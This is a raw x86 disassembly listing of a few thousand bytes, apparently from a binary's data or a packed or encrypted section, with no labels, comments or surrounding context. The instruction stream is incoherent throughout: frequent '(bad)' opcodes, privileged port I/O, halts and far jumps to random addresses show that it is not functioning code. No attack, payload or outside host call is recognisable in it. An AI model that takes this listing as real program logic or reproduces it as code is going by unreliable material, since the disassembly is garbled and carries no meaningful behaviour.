  40c9b2:	lock add edi,DWORD PTR [edx-0x44]
  40c9b6:	dec    ecx
  40c9b7:	sub    BYTE PTR [edi+ebp*4],dl
  40c9ba:	sbb    BYTE PTR [esi+0xf],dl
  40c9bd:	retf   
  40c9be:	dec    esi
  40c9bf:	(bad)  
  40c9c0:	cdq    
  40c9c1:	in     al,0x3c
  40c9c3:	push   ebp
  40c9c4:	add    ecx,esi
  40c9c6:	(bad)  
  40c9c7:	retf   0x49c0
  40c9ca:	push   esi
  40c9cb:	iret   
  40c9cc:	mov    edi,DWORD PTR [eax-0xf]
  40c9cf:	and    BYTE PTR [eax],bh
  40c9d1:	adc    bl,0x6d
  40c9d4:	adc    al,0x10
  40c9d6:	and    ecx,ecx
  40c9d8:	sbb    DWORD PTR [esp+edi*2+0x2dd95df1],ebx
  40c9df:	dec    edi
  40c9e0:	adc    BYTE PTR [edi+ebx*1],dh
  40c9e3:	lods   eax,DWORD PTR ds:[esi]
  40c9e4:	pop    ebp
  40c9e5:	mov    eax,ds:0x828c0042
  40c9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9eb:	mov    edi,0x5c9aa1d8
  40c9f0:	and    al,0xce
  40c9f2:	jbe    0x40ca12
  40c9f4:	inc    eax
  40c9f5:	sbb    DWORD PTR [ecx],ebp
  40c9f7:	dec    ecx
  40c9f8:	repz push ecx
  40c9fa:	fdiv   QWORD PTR [ecx]
  40c9fc:	add    eax,0x7ebe50c5
  40ca01:	loope  0x40ca14
  40ca03:	push   ebx
  40ca04:	jae    0x40c9ff
  40ca06:	mov    ah,0x7e
  40ca08:	and    DWORD PTR ds:0x29822d46,ebp
  40ca0e:	push   ecx
  40ca0f:	or     BYTE PTR [edi],cl
  40ca11:	test   BYTE PTR [edx+0x28150377],0xc8
  40ca18:	or     BYTE PTR [edx],ah
  40ca1a:	into   
  40ca1b:	rcl    DWORD PTR [edi],cl
  40ca1d:	cmp    al,0x1d
  40ca1f:	cwde   
  40ca20:	(bad)  
  40ca21:	pop    ebp
  40ca22:	mov    dh,0x30
  40ca24:	aas    
  40ca25:	pushf  
  40ca26:	imul   esi,DWORD PTR [esi+0x5a26a5e],0xffffff88
  40ca2d:	je     0x40ca51
  40ca2f:	jecxz  0x40ca85
  40ca31:	add    eax,0x509b8278
  40ca36:	bound  ecx,QWORD PTR [eax+0x11]
  40ca39:	inc    BYTE PTR [eax+0x76a6e8b6]
  40ca3f:	dec    eax
  40ca40:	jmp    0x40ca4f
  40ca42:	xchg   esi,eax
  40ca43:	sub    ebx,ebp
  40ca45:	pop    es
  40ca46:	mov    ch,BYTE PTR [edi]
  40ca48:	inc    eax
  40ca49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca4a:	pop    ebx
  40ca4b:	shl    DWORD PTR [esi+0x4ba25ed],0x23
  40ca52:	xchg   ecx,eax
  40ca53:	int    0xfc
  40ca55:	push   edx
  40ca56:	mov    bh,0xfc
  40ca58:	pop    eax
  40ca59:	xor    eax,0x7b816e7e
  40ca5e:	test   DWORD PTR [ecx+eiz*2-0x51],0xae2499b8
  40ca66:	aam    0x57
  40ca68:	xchg   ebp,eax
  40ca69:	pop    ss
  40ca6a:	addr16 popa 
  40ca6c:	xor    DWORD PTR [eax],edx
  40ca6e:	adc    eax,esi
  40ca70:	xor    ecx,0xffffff95
  40ca73:	(bad)  
  40ca74:	pop    es
  40ca75:	cmc    
  40ca76:	addr16 push cs
  40ca78:	mov    esp,0x199a1c2e
  40ca7d:	imul   esi,DWORD PTR fs:[ecx-0x78f67683],0xffffffc1
  40ca85:	cwde   
  40ca86:	imul   eax,DWORD PTR [ebx+0x481dabe],0xfcc3e4cf
  40ca90:	pop    ebx
  40ca91:	and    al,0x3b
  40ca93:	push   ebx
  40ca94:	aad    0x7e
  40ca96:	push   esp
  40ca97:	mov    dl,0x7b
  40ca99:	rol    ecx,0x4e
  40ca9c:	(bad)  
  40ca9e:	in     al,dx
  40ca9f:	xchg   edi,eax
  40caa0:	mov    ch,0xd6
  40caa2:	(bad)
  40caa6:	jp     0x40cacf
  40caa8:	fidivr DWORD PTR [edi-0x7b26833]
  40caae:	adc    esp,ecx
  40cab0:	xchg   BYTE PTR [eax+eiz*4],ch
  40cab3:	pop    ds
  40cab4:	pop    ss
  40cab5:	xchg   edx,eax
  40cab6:	sbb    BYTE PTR [edx],0x15
  40cab9:	mov    cl,BYTE PTR [ebx+0x51]
  40cabc:	test   eax,0x4be5deaa
  40cac1:	push   es
  40cac2:	cld    
  40cac3:	mov    cs,WORD PTR [eax+0x651e3b81]
  40cac9:	in     eax,0xc3
  40cacb:	outs   dx,BYTE PTR ds:[esi]
  40cacc:	dec    esi
  40cacd:	mov    edx,0x4557cb03
  40cad2:	mov    edi,0xb00de4ce
  40cad7:	jne    0x40ca5b
  40cad9:	cmp    edx,ebx
  40cadb:	mov    ecx,esp
  40cadd:	and    edx,ebx
  40cadf:	xchg   ebx,eax
  40cae0:	icebp  
  40cae1:	inc    ebp
  40cae2:	retf   
  40cae3:	inc    esi
  40cae4:	xchg   esp,eax
  40cae5:	xchg   esp,eax
  40cae6:	retf   
  40cae7:	mov    dh,0xe5
  40cae9:	test   eax,0x63a8a92e
  40caee:	xchg   ecx,eax
  40caef:	daa    
  40caf0:	lods   al,BYTE PTR ds:[esi]
  40caf1:	jno    0x40cadc
  40caf3:	arpl   WORD PTR [edx-0x623ac86e],bx
  40caf9:	jmp    0x40cb5b
  40cafb:	stc    
  40cafc:	fdivr  QWORD PTR [edx+0x45]
  40caff:	mov    ds:0x48fbc7c3,eax
  40cb04:	sbb    BYTE PTR [eax+0x653b7831],bl
  40cb0a:	mov    ebx,DWORD PTR [ebx+edx*1+0x3d]
  40cb0e:	(bad)  
  40cb0f:	mov    esp,0x83b2ab66
  40cb14:	mov    ecx,0xdeb9f9f2
  40cb19:	or     DWORD PTR [ebp+edi*4+0x1462bda1],ebp
  40cb20:	jp     0x40cb71
  40cb22:	bound  ebp,QWORD PTR [edi-0x3c]
  40cb25:	mov    cl,0x9e
  40cb27:	xor    esp,ebp
  40cb29:	sar    DWORD PTR [edi],1
  40cb2b:	pop    ds
  40cb2c:	jno    0x40cb65
  40cb2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb2f:	iret   
  40cb30:	pop    edx
  40cb31:	jmp    0xa25fff75
  40cb36:	pop    esp
  40cb37:	mov    bh,0x10
  40cb39:	nop
  40cb3a:	push   eax
  40cb3b:	call   0x79f:0x9dca3a24
  40cb42:	sar    DWORD PTR [eax-0x45],cl
  40cb45:	int    0xed
  40cb47:	inc    edi
  40cb48:	dec    esi
  40cb49:	adc    al,0x7b
  40cb4b:	rcr    DWORD PTR [edi-0x4d17f26b],1
  40cb51:	call   0xe919c9ff
  40cb56:	(bad)  
  40cb58:	in     al,0x14
  40cb5a:	xchg   esp,eax
  40cb5b:	or     BYTE PTR [ebx],al
  40cb5d:	jne    0x40cafa
  40cb5f:	ret    
  40cb60:	pop    esi
  40cb61:	sub    DWORD PTR ds:0x5a80cd79,eax
  40cb67:	inc    eax
  40cb68:	std    
  40cb69:	mov    eax,ds:0x5912f4
  40cb6e:	inc    edi
  40cb6f:	mov    cl,0x4c
  40cb71:	in     al,dx
  40cb72:	dec    ebx
  40cb73:	scas   al,BYTE PTR es:[edi]
  40cb74:	jae    0x40cbd3
  40cb76:	sub    ebp,DWORD PTR [ebx-0x63]
  40cb79:	dec    eax
  40cb7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb7b:	(bad)  
  40cb7c:	in     eax,0xee
  40cb7e:	call   0x23baef4b
  40cb83:	fwait
  40cb84:	jno    0x40cb36
  40cb86:	(bad)  
  40cb88:	rol    DWORD PTR [ecx-0x57],0xe9
  40cb8c:	lds    esp,FWORD PTR [ebp-0x5b845946]
  40cb92:	dec    eax
  40cb93:	dec    esi
  40cb94:	jae    0x40cc03
  40cb96:	lea    ecx,[eax]
  40cb98:	(bad)  
  40cb9a:	xor    esp,DWORD PTR [eax+0x5d664ea8]
  40cba0:	xchg   esp,eax
  40cba1:	(bad)  
  40cba2:	out    dx,al
  40cba3:	mov    esi,0x11aade42
  40cba8:	mov    cl,0x21
  40cbaa:	enter  0x88d5,0xef
  40cbae:	outs   dx,DWORD PTR ds:[esi]
  40cbaf:	dec    esp
  40cbb0:	cmp    DWORD PTR [ebx+ebp*1+0x1f35e310],ebp
  40cbb7:	inc    esp
  40cbb8:	in     al,0x67
  40cbba:	js     0x40cbb7
  40cbbc:	cmp    BYTE PTR ss:[edi],cl
  40cbbf:	sbb    BYTE PTR [ecx],ah
  40cbc1:	out    0x9d,al
  40cbc3:	push   ebp
  40cbc4:	mov    bl,0x17
  40cbc6:	pop    esi
  40cbc7:	lods   al,BYTE PTR ds:[esi]
  40cbc8:	mov    esp,0x2bb397e3
  40cbcd:	je     0x40cb57
  40cbcf:	xchg   ebp,eax
  40cbd0:	mov    DWORD PTR [ecx],ecx
  40cbd2:	or     al,0xf9
  40cbd4:	(bad)  
  40cbd5:	inc    edi
  40cbd6:	mov    ds:0x402ddf34,eax
  40cbdb:	dec    eax
  40cbdc:	enter  0xd67,0x28
  40cbe0:	or     BYTE PTR ds:0xa55cbffc,dh
  40cbe6:	cld    
  40cbe7:	mov    ebp,DWORD PTR [edx+ebx*2-0x7c]
  40cbeb:	mov    gs,WORD PTR [edi+0x1e95ee50]
  40cbf1:	push   esp
  40cbf2:	pop    ss
  40cbf3:	xchg   ebp,eax
  40cbf4:	sub    BYTE PTR [eax+edi*1],0x40
  40cbf8:	dec    eax
  40cbf9:	leave  
  40cbfa:	jmp    0xfce2:0x2b0d8a46
  40cc01:	sub    DWORD PTR [eax-0x521911e7],ecx
  40cc07:	add    ch,ch
  40cc09:	nop
  40cc0a:	lods   eax,DWORD PTR ds:[esi]
  40cc0b:	pop    ds
  40cc0c:	stos   BYTE PTR es:[edi],al
  40cc0d:	and    DWORD PTR [esi],edi
  40cc0f:	pop    eax
  40cc10:	add    DWORD PTR [edi-0x53],ecx
  40cc13:	enter  0x3079,0x5d
  40cc17:	push   ss
  40cc18:	loope  0x40cc90
  40cc1a:	fs ds dec edi
  40cc1d:	pop    ss
  40cc1e:	add    ebx,edi
  40cc20:	xor    BYTE PTR [esi-0x1e1822c],0x96
  40cc27:	enter  0xa5a0,0x69
  40cc2b:	test   al,0xdc
  40cc2d:	sub    DWORD PTR [ebx+0x39],0x23c8bea4
  40cc34:	in     al,0xbc
  40cc36:	out    0x92,eax
  40cc38:	scas   eax,DWORD PTR es:[edi]
  40cc39:	fistp  WORD PTR [edi-0x39]
  40cc3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc3e:	mov    eax,0xe9f520c0
  40cc43:	lods   al,BYTE PTR ds:[esi]
  40cc44:	mov    ebx,0x94eca7e5
  40cc49:	and    DWORD PTR [eax+0x65],esp
  40cc4c:	push   edx
  40cc4d:	aad    0xb1
  40cc4f:	test   BYTE PTR [edi+0x4e],cl
  40cc52:	aad    0x4c
  40cc54:	cmp    DWORD PTR [ebx-0x52d1738a],esp
  40cc5a:	add    ch,BYTE PTR [ebp-0x710a3a60]
  40cc60:	xchg   edx,eax
  40cc61:	(bad)  
  40cc62:	pop    esi
  40cc63:	xchg   edi,eax
  40cc64:	(bad)  
  40cc65:	fidiv  WORD PTR [ebx]
  40cc67:	lods   eax,DWORD PTR ds:[esi]
  40cc68:	test   esp,edi
  40cc6a:	cld    
  40cc6b:	fwait
  40cc6c:	test   BYTE PTR [ebx],al
  40cc6e:	fstp   DWORD PTR [edi+0x445f272d]
  40cc74:	fist   WORD PTR [ecx+0x29]
  40cc77:	in     al,dx
  40cc78:	mov    bl,0xc0
  40cc7a:	in     eax,0x5a
  40cc7c:	std    
  40cc7d:	or     eax,0x473623c
  40cc82:	and    cl,ah
  40cc84:	mov    eax,0x1e919285
  40cc89:	cld    
  40cc8a:	dec    edi
  40cc8b:	push   ss
  40cc8c:	shl    DWORD PTR [ebx+esi*2-0x2c],1
  40cc90:	out    0x51,al
  40cc92:	mov    DWORD PTR [ebp+ebx*8-0x247f3b58],esi
  40cc99:	cmp    eax,0x24311815
  40cc9e:	jge    0x40ccea
  40cca0:	push   ss
  40cca1:	hlt    
  40cca2:	push   es
  40cca3:	jnp    0x40ccee
  40cca5:	pop    edi
  40cca6:	sti    
  40cca7:	js     0x40ccb3
  40cca9:	xor    cl,BYTE PTR [ebx-0x45]
  40ccac:	fistp  QWORD PTR ds:0x37aa675f
  40ccb2:	cli    
  40ccb3:	or     BYTE PTR [edx],bh
  40ccb5:	(bad)  
  40ccb7:	das    
  40ccb8:	push   ebx
  40ccb9:	out    0x9f,eax
  40ccbb:	cdq    
  40ccbc:	inc    ecx
  40ccbd:	mov    dh,0x9
  40ccbf:	jo     0x40cc7d
  40ccc1:	std    
  40ccc2:	dec    esp
  40ccc3:	mov    dh,0x8a
  40ccc5:	jb     0x40cc52
  40ccc7:	dec    DWORD PTR [ecx-0x7a1f601]
  40cccd:	add    edi,DWORD PTR [edi]
  40cccf:	sbb    al,0x94
  40ccd1:	bound  ebx,QWORD PTR [ebx+0x18]
  40ccd4:	xchg   ebx,eax
  40ccd5:	in     eax,0xbc
  40ccd7:	popa   
  40ccd8:	cmp    eax,0x9223b4b9
  40ccdd:	add    ah,ah
  40ccdf:	jg     0x40ccf4
  40cce1:	in     eax,dx
  40cce2:	repz loope 0x40cc78
  40cce5:	mov    DWORD PTR [ebp+esi*1+0x1a9ea4c4],ecx
  40ccec:	mov    ah,BYTE PTR [ecx-0x24d2687c]
  40ccf2:	std    
  40ccf3:	sub    al,0x31
  40ccf5:	jmp    0x40cced
  40ccf7:	shr    BYTE PTR [eax+0x3b],cl
  40ccfa:	jg     0x40cd47
  40ccfc:	and    BYTE PTR [ebx],bl
  40ccfe:	dec    edx
  40ccff:	icebp  
  40cd00:	scas   al,BYTE PTR es:[edi]
  40cd01:	sub    BYTE PTR [ebx+0x4d],bh
  40cd04:	ds mov dl,0x1b
  40cd07:	les    esp,FWORD PTR [eax-0x3e]
  40cd0a:	out    dx,al
  40cd0b:	js     0x40cd54
  40cd0d:	xchg   DWORD PTR [esi-0x3ea03011],eax
  40cd13:	test   DWORD PTR [ebx-0x5cf2746d],0x83a5192e
  40cd1d:	cmp    DWORD PTR [ecx+ebx*2-0x66],eax
  40cd21:	sbb    al,0x8c
  40cd23:	inc    edi
  40cd24:	inc    edi
  40cd25:	push   ecx
  40cd26:	adc    cl,cl
  40cd28:	fidivr DWORD PTR [edx]
  40cd2a:	mov    dl,0x58
  40cd2c:	xor    al,0x3f
  40cd2e:	aad    0xa9
  40cd30:	or     dl,BYTE PTR [edx+0x43]
  40cd33:	mov    ds:0x75f54a62,eax
  40cd38:	inc    esp
  40cd39:	test   BYTE PTR ds:0x150e7002,ch
  40cd3f:	ins    DWORD PTR es:[edi],dx
  40cd40:	push   edi
  40cd41:	cdq    
  40cd42:	inc    eax
  40cd43:	ret    0x6f2f
  40cd46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd47:	mov    WORD PTR [esi+0x2565c4f5],fs
  40cd4d:	adc    esp,DWORD PTR [edi+0x154dd511]
  40cd53:	shr    BYTE PTR [edx-0x74],cl
  40cd56:	loope  0x40cce1
  40cd58:	test   BYTE PTR [esi],dl
  40cd5a:	dec    ecx
  40cd5b:	nop
  40cd5c:	and    esp,ebp
  40cd5e:	out    dx,al
  40cd5f:	inc    ebx
  40cd60:	dec    ecx
  40cd61:	retf   
  40cd62:	push   eax
  40cd63:	mov    bl,0x91
  40cd65:	inc    ecx
  40cd66:	outs   dx,DWORD PTR ds:[esi]
  40cd67:	sahf   
  40cd68:	fucomip st,st(7)
  40cd6a:	add    BYTE PTR [edi],al
  40cd6c:	out    0x1f,al
  40cd6e:	out    0x24,al
  40cd70:	and    al,0xdf
  40cd72:	call   0xd3c55561
  40cd77:	inc    edx
  40cd78:	repnz and al,0x26
  40cd7b:	xchg   esi,eax
  40cd7c:	inc    edx
  40cd7d:	(bad)  
  40cd7e:	xor    esi,DWORD PTR [esi+ebx*8-0x3]
  40cd82:	cs int 0xf6
  40cd85:	inc    edi
  40cd86:	iret   
  40cd87:	mov    dl,0x9e
  40cd89:	arpl   ax,di
  40cd8b:	daa    
  40cd8c:	add    al,0xbf
  40cd8e:	(bad)
  40cd91:	imul   eax,DWORD PTR [edx+0x30f37e31],0x4017d6e7
  40cd9b:	adc    al,0x69
  40cd9d:	scas   al,BYTE PTR es:[edi]
  40cd9e:	retf   0x446b
  40cda1:	lea    eax,[ebx+0x47b98c75]
  40cda7:	inc    ecx
  40cda8:	inc    ebx
  40cda9:	fs mov ecx,0x40c0274
  40cdaf:	sar    BYTE PTR [edx],0x7f
  40cdb2:	adc    eax,0x1129f836
  40cdb7:	ss out dx,al
  40cdb9:	push   0x50718e7e
  40cdbe:	pop    ecx
  40cdbf:	hlt    
  40cdc0:	and    DWORD PTR [ebp+0x36],ecx
  40cdc3:	(bad)  
  40cdc4:	pop    ebx
  40cdc5:	push   eax
  40cdc6:	pop    ss
  40cdc7:	jo     0x40ce18
  40cdc9:	push   0x15
  40cdcb:	jmp    0x49a8159b
  40cdd0:	mov    edi,0x6426cbb8
  40cdd5:	mov    dh,0xc
  40cdd7:	sub    DWORD PTR [ebx+0x66],esp
  40cdda:	mov    WORD PTR ds:0x5c022f68,gs
  40cde0:	leave  
  40cde1:	fcomp  QWORD PTR [esi]
  40cde3:	adc    eax,0x63b59f9d
  40cde8:	mov    esi,0x748582f7
  40cded:	push   eax
  40cdee:	test   BYTE PTR [ebp+0x3c],bl
  40cdf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdf2:	fwait
  40cdf3:	mov    al,ds:0xc51f660d
  40cdf8:	pop    eax
  40cdf9:	leave  
  40cdfa:	repz xchg ebp,eax
  40cdfc:	scas   eax,DWORD PTR es:[edi]
  40cdfd:	into   
  40cdfe:	jmp    0x40cd8d
  40ce00:	hlt    
  40ce01:	and    bl,ah
  40ce03:	inc    ebx
  40ce04:	fild   DWORD PTR [ecx-0x19a6cea0]
  40ce0a:	(bad)  
  40ce0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce0c:	add    al,0x4a
  40ce0e:	xchg   esi,eax
  40ce0f:	mov    ebx,0xa022d2d9
  40ce14:	mov    BYTE PTR [edi],ah
  40ce16:	addr16 xor eax,0x8dca386a
  40ce1c:	ss jl  0x40ce42
  40ce1f:	out    dx,al
  40ce20:	push   ebx
  40ce21:	or     ebx,ebx
  40ce23:	mov    dh,0xb6
  40ce25:	aaa    
  40ce26:	jmp    0x15ec205
  40ce2b:	scas   eax,DWORD PTR es:[edi]
  40ce2c:	lods   eax,DWORD PTR ds:[esi]
  40ce2d:	and    ebp,edx
  40ce2f:	lahf   
  40ce30:	shl    DWORD PTR [eax+0x0],0x3f
  40ce34:	retf   0x2af0
  40ce37:	cmp    al,0x9f
  40ce39:	inc    ebx
  40ce3a:	sub    DWORD PTR [eax],eax
  40ce3c:	or     al,0x2a
  40ce3e:	cmp    eax,0x2048a5aa
  40ce43:	stc    
  40ce44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce45:	(bad)  
  40ce46:	fwait
  40ce47:	add    esp,esp
  40ce49:	sub    al,0xbd
  40ce4b:	push   0x7a
  40ce4d:	imul   esp,DWORD PTR [eax-0x629a9b6f],0x252844a4
  40ce57:	inc    esp
  40ce58:	out    dx,eax
  40ce59:	sub    bh,0x94
  40ce5c:	xor    al,0x51
  40ce5e:	mov    al,ds:0x8ce0f43f
  40ce63:	sbb    edi,eax
  40ce65:	push   ebp
  40ce66:	and    al,0x94
  40ce68:	fisttp QWORD PTR [edx+0x324878e3]
  40ce6e:	shl    eax,cl
  40ce70:	pop    esi
  40ce71:	jo     0x40ceb5
  40ce73:	std    
  40ce74:	sub    ebx,esp
  40ce76:	sbb    BYTE PTR [ebx+0x35],dl
  40ce79:	pop    edx
  40ce7a:	inc    eax
  40ce7b:	mov    ebx,ds
  40ce7d:	aas    
  40ce7e:	repnz sti 
  40ce80:	mov    ecx,0x8b7a2bf5
  40ce85:	fs fcmovnbe st,st(1)
  40ce88:	mov    edx,0x21af2f12
  40ce8d:	push   ss
  40ce8e:	dec    edx
  40ce8f:	adc    DWORD PTR [ecx],esi
  40ce91:	call   0x50efde21
  40ce96:	test   DWORD PTR [ebx-0x2d],ebp
  40ce99:	add    al,0x3b
  40ce9b:	popa   
  40ce9c:	sbb    al,0xb9
  40ce9e:	add    eax,ebx
  40cea0:	repnz cmp eax,DWORD PTR [esi-0x1a]
  40cea4:	addr16 push eax
  40cea6:	or     eax,0xada091e4
  40ceab:	xor    al,0x43
  40cead:	add    al,0x1b
  40ceaf:	mov    eax,0x26dbda4c
  40ceb4:	mov    bh,0xaf
  40ceb6:	pop    edi
  40ceb7:	push   ebx
  40ceb8:	imul   eax,eax,0x9f1cc8c9
  40cebe:	clc    
  40cebf:	(bad)  
  40cec0:	cmp    al,0x57
  40cec2:	rol    BYTE PTR [esi],1
  40cec4:	pop    ecx
  40cec5:	mov    al,ds:0xdd469c34
  40ceca:	loope  0x40ced0
  40cecc:	test   bh,bh
  40cece:	(bad)  
  40cecf:	in     eax,dx
  40ced0:	stos   DWORD PTR es:[edi],eax
  40ced1:	hlt    
  40ced2:	rol    esp,cl
  40ced4:	into   
  40ced5:	xor    BYTE PTR [ebx-0x4e6f993c],0xec
  40cedc:	rcr    DWORD PTR [edx-0x4983f45c],0x1f
  40cee3:	jp     0x40ced3
  40cee5:	inc    ebp
  40cee6:	ss aam 0x23
  40cee9:	mov    DWORD PTR [ecx-0x228306c3],eax
  40ceef:	jne    0x40cec8
  40cef1:	cdq    
  40cef2:	ins    BYTE PTR es:[edi],dx
  40cef3:	push   cs
  40cef4:	push   ecx
  40cef5:	lods   eax,DWORD PTR ds:[esi]
  40cef6:	test   al,0x98
  40cef8:	call   0x3f445e25
  40cefd:	in     al,dx
  40cefe:	and    BYTE PTR [eax-0x4f28c116],bh
  40cf04:	scas   eax,DWORD PTR es:[edi]
  40cf05:	xor    eax,0x8e934505
  40cf0a:	mov    ebp,0xd50312ed
  40cf0f:	mov    edi,0xd3f9bcef
  40cf14:	jmp    0x6674f42a
  40cf19:	cmc    
  40cf1a:	adc    esi,DWORD PTR [edx+0x4]
  40cf1d:	mov    edi,0x6e8f05fa
  40cf22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf23:	iret   
  40cf24:	dec    ebx
  40cf25:	pop    es
  40cf26:	mov    ch,0x19
  40cf28:	pop    ebx
  40cf29:	add    DWORD PTR [edi-0x49c5ba91],esi
  40cf2f:	pop    esi
  40cf30:	imul   esp,DWORD PTR [edi+0x16fc8135],0xb11c4cc8
  40cf3a:	mov    ebp,ebp
  40cf3c:	imul   esi,ebp,0x66025bf5
  40cf42:	rcr    DWORD PTR [edi+0x74],cl
  40cf45:	fiadd  WORD PTR ds:0xcb3c3acd
  40cf4b:	cdq    
  40cf4c:	popa   
  40cf4d:	adc    ebp,ebx
  40cf4f:	lods   eax,DWORD PTR ds:[esi]
  40cf50:	rcl    DWORD PTR [ebp+0x5b370b4],0x46
  40cf57:	mov    al,ds:0xca59b343
  40cf5c:	fsub   st,st(7)
  40cf5e:	sub    al,0x4d
  40cf60:	jb     0x40cef6
  40cf62:	mov    dh,0x99
  40cf64:	pop    ds
  40cf65:	hlt    
  40cf66:	je     0x40cf81
  40cf68:	fisubr DWORD PTR [ebx-0x6d]
  40cf6b:	sbb    esi,DWORD PTR [edi]
  40cf6d:	scas   al,BYTE PTR es:[edi]
  40cf6e:	push   ss
  40cf6f:	aad    0xb
  40cf71:	test   al,0xa9
  40cf73:	mov    ebp,0x4366434d
  40cf78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf79:	rol    DWORD PTR [esp+edi*2],cl
  40cf7c:	dec    ecx
  40cf7d:	ja     0x40cf8c
  40cf7f:	loop   0x40cfc1
  40cf81:	loopne 0x40cf3f
  40cf83:	stc    
  40cf84:	das    
  40cf85:	fnsave [esi+0x6efe31b8]
  40cf8b:	loope  0x40d006
  40cf8d:	test   al,0x5c
  40cf8f:	sub    al,0x73
  40cf91:	sbb    eax,0x6dbbb572
  40cf96:	mov    edx,0xae07cda3
  40cf9b:	xchg   esi,eax
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,0x3547f082
  40cfa2:	retf   0xc1de
  40cfa5:	xor    ebx,esi
  40cfa7:	in     eax,dx
  40cfa8:	mov    eax,ds:0x1e000967
  40cfad:	mov    al,ds:0x1626a665
  40cfb2:	repz jnp 0x40cfa4
  40cfb5:	jle    0x40cf69
  40cfb7:	adc    dl,BYTE PTR [eax+0x39a4b262]
  40cfbd:	mov    DWORD PTR ds:[edx-0x44c6a254],ebx
  40cfc4:	stos   DWORD PTR es:[edi],eax
  40cfc5:	pop    es
  40cfc6:	and    DWORD PTR [ebx+0x70f5abba],ebx
  40cfcc:	addr16 je 0x40cf6e
  40cfcf:	sub    BYTE PTR [ebx],bl
  40cfd1:	and    eax,0xba024f01
  40cfd6:	lods   al,BYTE PTR ds:[esi]
  40cfd7:	aas    
  40cfd8:	pusha  
  40cfd9:	repz rcr BYTE PTR [edx+0x5],1
  40cfdd:	out    dx,al
  40cfde:	repz cwde 
  40cfe0:	push   cs
  40cfe1:	and    dh,0x78
  40cfe4:	cwde   
  40cfe5:	ins    DWORD PTR es:[edi],dx
  40cfe6:	xchg   edi,eax
  40cfe7:	aas    
  40cfe8:	jge    0x40d029
  40cfea:	ret    
  40cfeb:	adc    al,0xbd
  40cfed:	sub    BYTE PTR [eax+0x670042d6],bh
  40cff3:	rcl    BYTE PTR [ecx+0x3c],0x20
  40cff7:	inc    eax
  40cff8:	test   DWORD PTR [edx],ebp
  40cffa:	jns    0x40cfa4
  40cffc:	dec    ecx
  40cffd:	pusha  
  40cffe:	fs cld 
  40d000:	retf   
  40d001:	addr16 sub eax,0x21efd017
  40d007:	out    dx,eax
  40d008:	mov    bl,0xd
  40d00a:	mov    al,BYTE PTR [esi-0x7e]
  40d00d:	ins    BYTE PTR es:[edi],dx
  40d00e:	arpl   WORD PTR [ecx-0x27],si
  40d011:	popa   
  40d012:	loope  0x40d020
  40d014:	sub    dh,al
  40d016:	stos   DWORD PTR es:[edi],eax
  40d017:	cmc    
  40d018:	je     0x40cfd9
  40d01a:	xchg   esp,eax
  40d01b:	or     dh,BYTE PTR [edi]
  40d01d:	add    al,0x34
  40d01f:	push   0xdd77b4d4
  40d024:	and    bh,BYTE PTR [ebp+ebx*8+0x47f15492]
  40d02b:	daa    
  40d02c:	ror    BYTE PTR [ebx+0x63cd1cd3],0xc9
  40d033:	retf   0x8f72
  40d036:	loopne 0x40d050
  40d038:	xchg   esp,eax
  40d039:	inc    eax
  40d03a:	int3   
  40d03b:	addr16 or al,0x6d
  40d03e:	out    dx,al
  40d03f:	sahf   
  40d040:	sbb    esp,DWORD PTR [ecx+0x28b538ac]
  40d046:	push   ebp
  40d047:	lahf   
  40d048:	icebp  
  40d049:	jl     0x40d04d
  40d04b:	inc    cl
  40d04d:	lahf   
  40d04e:	add    al,0x47
  40d050:	sbb    al,BYTE PTR gs:[edi-0x50]
  40d054:	mov    bl,0xf2
  40d056:	adc    BYTE PTR [ebx],al
  40d058:	inc    ecx
  40d059:	pop    esp
  40d05a:	pop    ss
  40d05b:	mov    ecx,0x75d3bcb7
  40d060:	mov    esp,0xcd34420
  40d065:	xchg   ebp,eax
  40d066:	loope  0x40d0cc
  40d068:	mov    esp,DWORD PTR [ebp-0x5308f7aa]
  40d06e:	pop    ebx
  40d06f:	hlt    
  40d070:	lods   eax,DWORD PTR ds:[esi]
  40d071:	aas    
  40d072:	push   es
  40d073:	cdq    
  40d074:	xor    eax,DWORD PTR [edi+eax*8]
  40d077:	ss xchg ebp,eax
  40d079:	or     eax,DWORD PTR [edx+0x64a6ac20]
  40d07f:	mov    esi,0x1803db71
  40d084:	jle    0x40d01c
  40d086:	imul   ebx,DWORD PTR [edx],0x15
  40d089:	push   DWORD PTR [ecx+0x1c1ea13b]
  40d08f:	xlat   BYTE PTR ds:[ebx]
  40d090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d091:	add    ch,BYTE PTR [ebp+0x21118f33]
  40d097:	(bad)  
  40d098:	mov    si,0x13bf
  40d09c:	in     eax,dx
  40d09d:	add    ebx,ecx
  40d09f:	xor    esp,esi
  40d0a1:	ss mov ch,0x58
  40d0a4:	inc    esi
  40d0a5:	mov    cl,BYTE PTR [ebx+0x52]
  40d0a8:	mov    ebx,DWORD PTR [ecx]
  40d0aa:	or     al,0xd6
  40d0ac:	mov    WORD PTR [edi],cs
  40d0ae:	or     edx,DWORD PTR [edi]
  40d0b0:	sti    
  40d0b1:	sahf   
  40d0b2:	(bad)  
  40d0b3:	sub    DWORD PTR [eax+esi*2+0x28],esi
  40d0b7:	outs   dx,BYTE PTR ds:[esi]
  40d0b8:	ss push ecx
  40d0ba:	xchg   esp,eax
  40d0bb:	push   cs
  40d0bc:	mov    BYTE PTR [esp],ah
  40d0bf:	mul    BYTE PTR [esi-0x79]
  40d0c2:	mov    ds:0x73d3d3cc,al
  40d0c7:	cmp    al,0xd
  40d0c9:	fistp  DWORD PTR [edi-0x74bc3d43]
  40d0cf:	mov    esi,0x1932c161
  40d0d4:	mov    WORD PTR [eax],fs
  40d0d6:	inc    ebp
  40d0d7:	faddp  st(1),st
  40d0d9:	xor    eax,0xaed40601
